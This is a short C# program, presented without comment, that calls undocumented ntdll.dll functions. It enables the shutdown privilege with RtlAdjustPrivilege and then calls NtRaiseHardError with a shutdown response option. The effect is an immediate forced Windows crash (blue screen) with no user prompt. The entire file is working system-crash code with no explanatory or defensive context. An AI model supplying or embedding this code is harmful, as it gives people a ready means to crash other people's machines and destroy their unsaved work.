using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
	[DllImport("ntdll.dll")]
	private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
		out bool PreviousValue);
	[DllImport("ntdll.dll")]
	private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
		IntPtr Parameters,
		uint ValidResponseOption, out uint Response);

	static void Main(string[] args)
	{
		RtlAdjustPrivilege(19, true, false, out bool idk);
		NtRaiseHardError(0xc0000420, 0, 0, IntPtr.Zero, 6, out uint output);
	}
}